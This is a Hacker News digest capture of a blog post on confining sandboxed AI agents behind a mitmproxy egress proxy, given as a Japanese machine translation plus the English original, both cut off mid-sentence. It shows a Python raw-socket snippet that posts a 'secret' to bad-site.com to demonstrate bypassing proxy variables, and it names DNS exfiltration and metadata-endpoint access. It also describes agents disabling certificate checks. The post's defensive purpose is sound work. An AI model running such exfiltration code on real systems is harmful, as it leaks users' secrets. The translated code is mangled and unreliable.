---
source: "https://simedw.com/2026/06/05/proxy-agents/"
hn_url: "https://news.ycombinator.com/item?id=48411484"
title: "How to force AI agents to use an egress proxy"
article_title: "How to force AI agents to use an egress proxy - SimEdw's Blog"
author: "simedw"
captured_at: "2026-06-05T13:09:14Z"
capture_tool: "hn-digest"
hn_id: 48411484
score: 3
comments: 0
posted_at: "2026-06-05T12:27:23Z"
tags:
  - hacker-news
  - translated
---

# How to force AI agents to use an egress proxy

- HN: [48411484](https://news.ycombinator.com/item?id=48411484)
- Source: [simedw.com](https://simedw.com/2026/06/05/proxy-agents/)
- Score: 3
- Comments: 0
- Posted: 2026-06-05T12:27:23Z

## Translation

タイトル: AI エージェントに出力プロキシの使用を強制する方法
記事のタイトル: AI エージェントに出力プロキシの使用を強制する方法 - SimEdw のブログ
説明: サンドボックス化された AI エージェントに無制限の下りを許可せずにインターネット アクセスを提供する方法。

記事本文:
simedw@ブログ
AI エージェントに出力プロキシの使用を強制する方法
ほとんどの AI エージェントはインターネット アクセスを必要とします。最も基本的なレベルでは、モデル プロバイダーの API 1 を呼び出すために必要ですが、ドキュメントの取得、パブリック リポジトリのクローン作成、情報の検索などにも必要です。
まずはインターネットにアクセスできるようにすることから始めるかもしれません。これで api.anthropic.com を呼び出すことができるようになりましたが、シークレットをランダムなサーバーにカールすることもできます。必要なパッケージをインストールできますが、AWS インスタンスのメタデータ エンドポイント 2 である 169.254.169.254 にヒットすることもあります。
ただし、アクセス権を奪うと、エージェントの有用性が低くなります。
無制限の下りを許可せずに、エージェントに十分なインターネットを提供して使用できるようにするにはどうすればよいでしょうか?
サンドボックス環境でエージェントを実行していると仮定します。したがって、私たちの目標は単純です。サンドボックスから抜け出す唯一の方法はプロキシを経由することです。プロキシはリクエストを検査し、許可または拒否し、さらには変更することもできます。
その保証を維持するには、適用がアプリケーション層の下に存在する必要があります。エージェントは、環境変数を変更したり、SDK 設定を無視したり、未加工のソケットを開いたりする可能性があります。
ネットワーク層はこれを強制する必要があります。プロキシは、残っている 1 つの送信パス上のポリシー エンジンにすぎません。
最初の試み: 環境変数
最初に試行するのは、プロキシ環境変数を設定することです。
エクスポート HTTP_PROXY = http://proxy:8080
エクスポート HTTPS_PROXY = http://proxy:8080
エクスポート ALL_PROXY = http://proxy:8080
これは、ほとんどのソフトウェア、curl、requests、Anthropic/OpenAI SDK などで機能します。ただし、この規則を尊重するかどうかはクライアント次第です。
インポートソケット
s = ソケット。ソケット ()
s 。接続 (( "bad-site.com" , 80 ))
body = b「秘密」
s 。センドール（
b "POST / HTTP/1.1 \r\n "
b "ホスト: bad-site.com \r\n "
b "Content-Length: " + str ( len (

体 ）） 。エンコード () + b " \r\n "
b "接続: 閉じます \r\n "
b " \r\n " +
体
)
コンテナがプロキシをバイパスして bad-site.com に到達するために必要なのはこれだけです。
それを強制する何かが必要です。
2 回目の試み: Docker ネットワーク
例では Docker + gVisor を想定しますが、同じ高レベルのパターンが Firecracker や同様のサンドボックス境界にも適用されます。 3
Docker には内部ネットワークという概念があります。これは、外部へのデフォルト ルートがなく、他のコンテナへのみのネットワークです。次に、エージェントを内部サンドボックス ネットワークに配置し、プロキシをサンドボックスと出力ネットワークの両方に配置すると、プロキシが唯一の出口になります。
ネットワーク :
サンドボックス:
内部 : true
出口:
ドライバー：ブリッジ
改善されましたが、まだいくつかの問題があります:
Internal: true はデフォルト ルートの出力をブロックしますが、Docker は引き続き 127.0.0.11 の組み込み DNS リゾルバーをそのネットワーク上のコンテナーに接続します。 DNS は秘密チャネルとして機能できます。 DNS クエリを実行できるエージェントは、一度に 1 つのホスト名検索でデータを抽出できます。
エージェントは、プロキシ ポートだけでなく、公開する任意のポート上のプロキシ コンテナに到達することもできます。同じサンドボックス ネットワーク上に他のものが存在する場合、エージェントはそれと通信できます。コンテナは、ブリッジ ゲートウェイ IP を介してホスト側のサービスに到達することもあり、これにより、FORWARD チェーンではなくホストの INPUT チェーンがヒットします。また、明示的に処理しない限り、IPv6 は別のパスになります。 IPv4 iptables ルールは IPv6 トラフィックには影響しません。
サンドボックスが 1 つの宛先 (プロキシ) にのみ接続できることを確認する必要があります。
私たちの実稼働セットアップでは、実行される各エージェントは、独自の iptables チェーンと ipset を備えた独自の Linux ブリッジを取得します。コンテナからの出力パスである FORWARD チェーンのルールはおおよそ次のとおりです。
ESTABLISHED,RELATED は、すでにオープンされている接続の高速パスとして ACCEPT に設定されます。
私

CMP から DROP まで。このサンドボックスにはこれは必要ありません。これは別のトンネリング パスです。
UDPからドロップへ。これにより、DNS が意図的に停止されます。
過剰な接続を削除するための TCP SYN レート制限。
TCP SYN 同時接続は、過剰な接続を DROP に制限します。
ブリッジごとの ipset の宛先を ACCEPT に、それ以外の場合は LOG および DROP にします。
ipset には、 (proxy_ip, proxy_port) というエントリーが 1 つだけ含まれています。それ以外は何も伝わりません。
別の INPUT ルールにより、プロキシ ポートを除き、ブリッジからホストへのトラフィックがドロップされます。これがないと、コンテナは自身のブリッジ ゲートウェイ IP を狙ってホスト上のサービスに到達する可能性があります。 IPv6 はブリッジ上で無効になっています。帯域幅は tc tbf を使用してブリッジごとにポリシングされるため、1 つの暴走エージェントがアップリンクを飽和させることはできません。
プロキシ環境変数はコンテナ内に引き続き存在しますが、便宜的に提供されているだけです。これらは、SDK とパッケージ マネージャーが追加の構成を行わずにプロキシを見つけるのに役立ちます。これらはセキュリティ上何の役割も果たしません。セキュリティは、ネットワークが他の場所へのパケットを受け入れないという事実から生まれます。
通常のリゾルバー パスを削除し、ファイアウォール ルールで DNS 出力を削除することにより、サンドボックス内で DNS を使用できなくなります。プロキシ自体のホスト名はコンテナ内の /etc/hosts を通じて挿入されるため、SDK は引き続きプロキシに到達でき、アップストリームのホスト名解決はすべてプロキシ内で行われます。一部のクライアントは、ターゲット ホスト名を自分で解決しようとしてはいけないというヒントを必要とします。例えば。クロード コードには、プロキシがアップストリーム解決を担当することを理解できるように、 *_PROXY_RESOLVES_HOSTS=1 スタイル フラグが必要です。
DNS を強制終了すると、秘密チャネルとして DNS が削除されます。しかし、それはホスト名ポリシーがプロキシによって制御されるものであることも意味します。エージェント自体がホスト名を解決する場合、名前は許可されているように見えても IP が許可されていないという SSRF および再バインドのケースが発生する可能性があります。プロキシは必要なものである必要があります

hat が解決され、宛先が確認されます。
この時点で、すべての送信パケットはプロキシに送られます。では、ファイアウォール ルールを使用してプロキシをスキップしてみてはどうでしょうか?
ファイアウォールは接続が存在できるかどうかを決定しますが、通常は接続の意図を理解していません。
api.anthropic.com:443 を許可できますが、これにより、Anthropic に対するすべての可能な API 呼び出し (すべてのモデル、すべての操作、すべての資格情報) が許可されます。ファイアウォールは正しい API キーを挿入しません。パブリック リポジトリとプライベート リポジトリへのプッシュの違いを理解していません。
ファイアウォールはプロキシが確実に使用されるようにするために必要ですが、それだけでは十分ではありません。
この場合、プロキシは HTTP(S) プロキシです。任意の TCP 出力は許可されません。これにより、IP とポートだけではなく、ホスト名、メソッド、パス、ヘッダー、ペイロードに基づいて決定を下せるようになります。
認証情報をサンドボックス内に保存することは決してせず、代わりにエージェントのプレースホルダー認証情報を与えます。
ANTHROPIC_API_KEY = サンドボックス プレースホルダー
OPENAI_API_KEY = サンドボックス プレースホルダー
これらは、SDK コンストラクターが初期化中にクラッシュしないようにするために存在します。
次に、送信リクエストごとに、プロキシはシークレット ストアからの実際のシークレットでアップストリーム認証ヘッダーを書き換えます。エージェントは本当の秘密を受け取ることは決してないので、それを直接抽出することはできません。
サンドボックスを実行するたびに、有効期間の短い JWT がプロキシ URL に埋め込まれます。
http://x:<jwt>@proxy:8080
その JWT は、各リクエストで Proxy-Authorization として送信されます。プロキシは、HTTPS の各 CONNECT リクエストおよび各プレーン HTTP リクエストでそれを検証します。トークンには、どの顧客がエージェントを実行しているか、およびその実行が持つ権限に関する情報が含まれます。
これは、このセッションでどのドメインが許可リストに登録されているか、どのモデルが許可されているかなどをプロキシに通知するために使用されます。
JWT はエージェントからの隠された資格情報ではありませんが、相対的なものです。

イーリーは短命でした。
プロキシは、プロキシ側でターゲットのホスト名を解決します。すべての接続で、解決された IP がループバック、プライベート、リンクローカル、マルチキャスト、予約済み、またはグローバルにルーティングできない場合、要求は拒否されます。また、解決された IP への接続を固定するため、アップストリームは TTL=0 の再バインド トリックを通じてリクエスト中にピボットすることができません。
これは、ホワイトリストに登録されたホスト名が 169.254.169.254 に解決されるという古典的なケースから保護するものです。プロキシが DNS を実行する唯一の手段であるため、これは機能します。
ペイロードの検査と書き換え
プロキシは HTTP ペイロードの読み取りと書き換えができます。つまり、パブリック リポジトリからの読み取りを許可しながらプライベート リポジトリへの書き込みをブロックし、顧客を別のプロバイダーにルーティングするためにモデル名を書き換え、課金のためにストリーミング SSE 応答から使用状況を解析し、サーバー側のシークレットをリクエスト本文に置き換えることを意味します。
Anthropic SDK から Gemini の API への呼び出しを書き換えて、Gemini 3.5 Flash 上でクロード コードを実行することもできます。
プロキシ自体は mitmproxy です。これは、インターセプト用に構築されたオープンソースの HTTPS プロキシです。独自の CA を使用して TLS を終了し、オンザフライでホストごとのリーフ証明書を生成し、リクエストとレスポンスを構造化オブジェクトとして認識する Python アドオンを作成できるようにします。
mitmproxy インポート http から
クラス注入キー:
def request (self , flow : http . HTTPFlow ) -> なし :
流れがあれば。リクエスト 。 pretty_host == "api.anthropic.com" :
流れ。リクエスト 。 headers [ "x-api-key" ] = real_key_for ( flow )
def 応答 (self 、 flow : http . HTTPFlow ) -> なし :
Record_usage (フロー.レスポンス.コンテンツ)
アドオン = [InjectKey()]
ポリシーは通常の Python 内に存在します。この設定では、アドオンはオーケストレーターにコールバックして、JWT を確認し、資格情報を取得し、トークンの使用状況を確認します。
プロキシがペイロードを読み取ったり書き換えたりするには、TLS を終了する必要があります。

これは、文字通りの意味での MITM であることを意味します。すべての言語エコシステムには、証明書が存在する場所について独自の考え方があるため、次のすべてを設定する必要があります。
SSL_CERT_FILE = /etc/ssl/certs/ca-certificates.crt
REQUESTS_CA_BUNDLE = /etc/ssl/certs/ca-certificates.crt
NODE_EXTRA_CA_CERTS = /etc/ssl/certs/ca-certificates.crt
CURL_CA_BUNDLE = /etc/ssl/certs/ca-certificates.crt
GRPC_DEFAULT_SSL_ROOTS_FILE_PATH = /etc/ssl/certs/ca-certificates.crt
これらのいずれかが欠けていると、一部のクライアントが TLS エラーをスローします。魅力的な修正は verify=False であり、エージェントは魅力的な修正を見つけるのが得意です。これによりサンドボックスはバイパスされない可能性がありますが、証明書検証の無効化が常態化し、エージェントが作成するコードに漏洩する可能性があります。プロキシ CA をどこでも機能させるほうがよいでしょう。
サンドボックスごとに新しいプロキシ プロセスを作成する必要はありません。 Mitmproxy は 1 つのプロセスで複数のアドレスにバインドできます。1 つのプロキシが多くのゲートウェイ IP をリッスンし、サンドボックス ブリッジごとに 1 つずつ接続します。サンドボックスは現れたり消えたりします。プロキシは温かい状態を保ちます。サンドボックスが要求されると、実行ごとの状態がプッシュされます。
証明書固定クライアントは別のケースです。システム トラスト ストアが正しく構成されている場合でも、プロキシ CA を拒否する可能性があります。
エージェントプロセス
│
│ ネットワークが受け入れる唯一の宛先
▼
プロキシ:8080
│
│ JWT を検証する
│ allowed_domains をチェックします
│ ホスト名を解決します
│ プライベート IP を拒否します
│ 認証ヘッダーを書き換えます
│ シークレット ストアから資格情報を挿入します
│ 応答を読み取り、解析します
│ 使用状況を記録する
▼
上流
戦いの傷跡
プロバイダーのプリフライト呼び出し。 Claude Code は、api.anthropic.com の /api/claude_code をプローブし、起動時に raw.githubusercontent.com/anthropics/claude から構成を取得します。リクエストを通過させても、レスポンスの形状が期待したものと異なる場合、処理はハングします。プロキシで 404 を使用してこれらをフェイルファーストします。
SSE の途中でドロップします。上流の場合

m 接続がストリーミング応答の途中で切断されると、単純な mitmproxy はソケットを閉じるだけです。 Anthropic SDK は次のイベントを待ってハングします。 SDK がクリーンなエラーを取得できるように、閉じる前に合成イベント: エラー SSE チャンクを挿入します。
上流のソケットが死んでいます。アップストリーム接続がサイレントに切断され、ロード バランサが切断し、NAT エントリがタイムアウトすると、デフォルトで Linux カーネルがそれに気づくまでに約 2 時間かかりますが、これはキープアライブが有効になっている場合のみです。エージェントの SDK はそこに留まり、決して到着しないバイトを待ちます。プロキシでsocket.connectにモンキーパッチを適用して、すべての送信ソケットでSO_KEEPALIVEを有効にし、 TCP_KEEPIDLE=5 、 TCP_KEEPINTVL=3 、 TCP_KEEPCNT=3 で調整します。これにより、カーネルは数秒以内に切断された接続を切断し、プロキシはSDKに実際のエラーを表示できます。
gVisor は eth0 IP を盗みます。これは、サンドボックスの実行全体でネットワーク名前空間をリサイクルする場合にのみ問題になりますが、実際にリサイクルすると、イライラすることになります。サンドボックスの初期化中に、runsc は netlink.AddrDel 経由で eth0 から IP アドレスを削除し、独自の内部スタックを構成します。これにより、デフォルト ルートも削除されます。リリースのたびに、IP とデフォルト ルートを再追加する必要があります。
これらすべてをセキュリティとして組み立てるのは簡単です。それは主に次のとおりです: 流出の防止

[切り捨てられた]

## Original Extract

How we give sandboxed AI agents internet access without giving them unrestricted egress.

simedw@blog
How to force AI agents to use an egress proxy
Most AI agents need internet access to be useful. At the most fundamental level, they need it to call the model provider's API 1 , but also for things like fetching documentation, cloning public repos, or searching for information.
You might start off by giving it internet access. Now it can call api.anthropic.com , but it can also curl your secrets to a random server. It can install the packages you need, but it can also hit 169.254.169.254 , the AWS instance metadata endpoint 2 .
But if you take away the access, the agent becomes less useful.
How do we give the agent enough internet to be useful, without giving it unrestricted egress?
I'm going to assume that we are running the agents in a sandbox environment. Then our goal is simple: the only way out of the sandbox is through the proxy. The proxy can inspect requests, permit or deny them, and even modify them.
For that guarantee to hold, enforcement has to live below the application layer. The agent could potentially change environment variables, ignore SDK configurations, or even open raw sockets.
The network layer has to enforce this. The proxy is just the policy engine on the one outbound path that remains.
First attempt: environment variables
The first thing to try is to set the proxy environment variables.
export HTTP_PROXY = http://proxy:8080
export HTTPS_PROXY = http://proxy:8080
export ALL_PROXY = http://proxy:8080
This works for most software, curl , requests , the Anthropic/OpenAI SDKs, etc. But it's up to the client to honor this convention.
import socket
s = socket . socket ()
s . connect (( "bad-site.com" , 80 ))
body = b "secret"
s . sendall (
b "POST / HTTP/1.1 \r\n "
b "Host: bad-site.com \r\n "
b "Content-Length: " + str ( len ( body )) . encode () + b " \r\n "
b "Connection: close \r\n "
b " \r\n " +
body
)
This is all that is needed for the container to bypass the proxy and reach bad-site.com .
We need something that enforces it.
Second attempt: Docker networks
I'm going to assume Docker + gVisor for the examples, but the same high-level pattern applies to Firecracker and similar sandbox boundaries. 3
Docker has a concept of an internal network: a network with no default route to the outside world, only to other containers. If we then put the agent on the internal sandbox network and put the proxy on both the sandbox and an egress network, then the proxy becomes the only way out.
networks :
sandbox :
internal : true
egress :
driver : bridge
Better, but still with some issues:
internal: true blocks default-route egress, but Docker still attaches its embedded DNS resolver at 127.0.0.11 to containers on that network. DNS can act as a covert channel. An agent that can make DNS queries can exfiltrate data one hostname lookup at a time.
The agent can also reach the proxy container on any port it exposes, not just the proxy port. If anything else lands on the same sandbox network, the agent can talk to it. A container may also reach host-side services through its bridge gateway IP, which hits the host's INPUT chain rather than the FORWARD chain. And unless you explicitly handle it, IPv6 is another path; IPv4 iptables rules don't touch IPv6 traffic.
We need to ensure that the sandbox can connect to only one destination: the proxy.
In our production setup, each agent run gets its own Linux bridge with its own iptables chain and ipset. The rules on the FORWARD chain, which is the egress path from the container, are roughly:
ESTABLISHED,RELATED to ACCEPT, as the fast path for connections already open.
ICMP to DROP. We do not need it for this sandbox, and it is another tunnelling path.
UDP to DROP. This intentionally kills DNS.
TCP SYN rate limit to DROP excess connections.
TCP SYN concurrent connection limit to DROP excess connections.
Destination in the per-bridge ipset to ACCEPT, otherwise LOG and DROP.
The ipset contains exactly one entry: (proxy_ip, proxy_port) . Nothing else gets through.
A separate INPUT rule drops traffic from the bridge to the host except for the proxy port. Without this, a container could reach services on the host by aiming at its own bridge gateway IP. IPv6 is disabled on the bridge. Bandwidth is policed per bridge with tc tbf , so one runaway agent cannot saturate the uplink.
The proxy environment variables are still present in the container, but only as a convenience. They help SDKs and package managers find the proxy without extra configuration. They play no role in security. The security comes from the fact that the network will not accept packets to anywhere else.
We make DNS unavailable inside the sandbox by removing the normal resolver paths and dropping DNS egress in the firewall rules. The proxy's own hostname is injected through /etc/hosts inside the container so SDKs can still reach it, and all upstream hostname resolution happens in the proxy. Some clients need a hint that they should not try to resolve target hostnames themselves. E.g. Claude Code needs a *_PROXY_RESOLVES_HOSTS=1 -style flag so it understands that the proxy is responsible for upstream resolution.
Killing DNS removes it as a covert channel. But it also means hostname policy is something the proxy controls. If the agent resolves hostnames itself, you can get SSRF and rebinding cases where the name looks allowed but the IP is not. The proxy needs to be the thing that resolves and checks the destination.
At this point, every outbound packet goes to the proxy. So why not just use firewall rules and skip the proxy?
A firewall decides whether a connection can exist, but doesn't normally understand the intent of the connection.
You can allow api.anthropic.com:443 , but that allows every possible API call to Anthropic: every model, every operation, every credential. A firewall wouldn't inject the right API key. It doesn't understand the difference between pushing to a public vs a private repo.
The firewall is necessary to ensure the proxy is used, but it is not enough on its own.
In our case, the proxy is an HTTP(S) proxy; arbitrary TCP egress is not allowed. That is what lets it make decisions based on hostnames, methods, paths, headers, and payloads rather than just IPs and ports.
We never want to store credentials inside a sandbox, instead we give the agent placeholder credentials:
ANTHROPIC_API_KEY = sandbox-placeholder
OPENAI_API_KEY = sandbox-placeholder
They exist so SDK constructors don't crash during initialisation.
Then on every outbound request, the proxy rewrites the upstream auth headers with the real secret from a secret store. The agent never receives the real secret, so it cannot directly exfiltrate it.
Every sandbox run gets a short lived JWT embedded in the proxy URL:
http://x:<jwt>@proxy:8080
That JWT is sent on each request as Proxy-Authorization . The proxy verifies it on each CONNECT request for HTTPS and on each plain HTTP request. The token carries information about which customer is running the agent and the rights this run has.
This is then used to inform the proxy which domains are allowlisted, which models are allowed, etc for this session.
The JWT is not a hidden credential from the agent, but it's relatively short lived.
The proxy resolves the target hostname on the proxy side. On every connection, it rejects the request if any resolved IP is loopback, private, link-local, multicast, reserved, or otherwise not globally routable. It also pins the connection to the resolved IP, so the upstream cannot pivot mid-request through a TTL=0 rebinding trick.
This is what protects against the classic case where an allowlisted hostname resolves to 169.254.169.254 . It works because the proxy is the only thing doing DNS.
Payload inspection and rewriting
The proxy can read and rewrite HTTP payloads. That means blocking writes to private repos while allowing reads from public ones, rewriting model names to route a customer to a different provider, parsing usage out of streaming SSE responses for billing, and substituting server-side secrets into request bodies.
We can even rewrite calls from Anthropic SDK to Gemini's API and get Claude Code running on Gemini 3.5 Flash.
The proxy itself is mitmproxy . It is an open-source HTTPS proxy built for interception: it terminates TLS using its own CA, generates per-host leaf certificates on the fly, and lets you write Python addons that see requests and responses as structured objects.
from mitmproxy import http
class InjectKey :
def request ( self , flow : http . HTTPFlow ) -> None :
if flow . request . pretty_host == "api.anthropic.com" :
flow . request . headers [ "x-api-key" ] = real_key_for ( flow )
def response ( self , flow : http . HTTPFlow ) -> None :
record_usage ( flow . response . content )
addons = [ InjectKey ()]
Policy lives in normal Python. In our setup the addon calls back into the orchestrator to verify the JWT, fetch credentials, and acknowledge token usage.
For the proxy to read or rewrite payloads, it has to terminate TLS, which means it is a MITM in the literal sense. Every language ecosystem has its own idea of where certificates live, so you have to set all of:
SSL_CERT_FILE = /etc/ssl/certs/ca-certificates.crt
REQUESTS_CA_BUNDLE = /etc/ssl/certs/ca-certificates.crt
NODE_EXTRA_CA_CERTS = /etc/ssl/certs/ca-certificates.crt
CURL_CA_BUNDLE = /etc/ssl/certs/ca-certificates.crt
GRPC_DEFAULT_SSL_ROOTS_FILE_PATH = /etc/ssl/certs/ca-certificates.crt
Miss one of these and some client will throw a TLS error. The tempting fix is verify=False , and agents are very good at finding tempting fixes. That may not bypass the sandbox, but it normalises disabling certificate verification and can leak into code the agent writes. Better to make the proxy CA work everywhere.
You don't need a new proxy process per sandbox. Mitmproxy can bind to multiple addresses in a single process: one proxy listens on many gateway IPs, one per sandbox bridge. Sandboxes come and go; the proxy stays warm. Per-run state is pushed in when a sandbox is claimed.
Certificate-pinned clients are a separate case: they may reject the proxy CA even when the system trust store is configured correctly.
agent process
│
│ only destination the network accepts
▼
proxy:8080
│
│ verifies JWT
│ checks allowed_domains
│ resolves hostname
│ rejects private IPs
│ rewrites auth headers
│ injects credentials from secrets store
│ reads and parses response
│ records usage
▼
upstream
Battle scars
Provider preflight calls. Claude Code probes /api/claude_code on api.anthropic.com and pulls a config from raw.githubusercontent.com/anthropics/claude at startup. If you let the requests through but the response shape is not what it expects, things hang. We fail-fast these with a 404 at the proxy.
SSE mid-stream drops. If an upstream connection dies in the middle of a streaming response, plain mitmproxy just closes the socket. The Anthropic SDK then hangs waiting for the next event. We inject a synthetic event: error SSE chunk before closing so the SDK gets a clean error.
Dead upstream sockets. When an upstream connection dies silently, a load balancer drops it, a NAT entry times out, the Linux kernel takes about two hours to notice by default, and only if keepalive is enabled at all. The agent's SDK sits there waiting for bytes that will never arrive. We monkey-patch socket.connect in the proxy to enable SO_KEEPALIVE on every outbound socket and tune it down with TCP_KEEPIDLE=5 , TCP_KEEPINTVL=3 , TCP_KEEPCNT=3 , so the kernel tears down a dead connection within seconds and the proxy can surface a real error to the SDK.
gVisor steals the eth0 IP. This only matters if you recycle network namespaces across sandbox runs, but when you do, it is maddening. During sandbox init, runsc removes the IP address from eth0 via netlink.AddrDel to configure its own internal stack, which also removes the default route. You have to re-add the IP and default route after each release.
It is easy to frame all of this as security. And it mostly is: preventing exfiltra

[truncated]
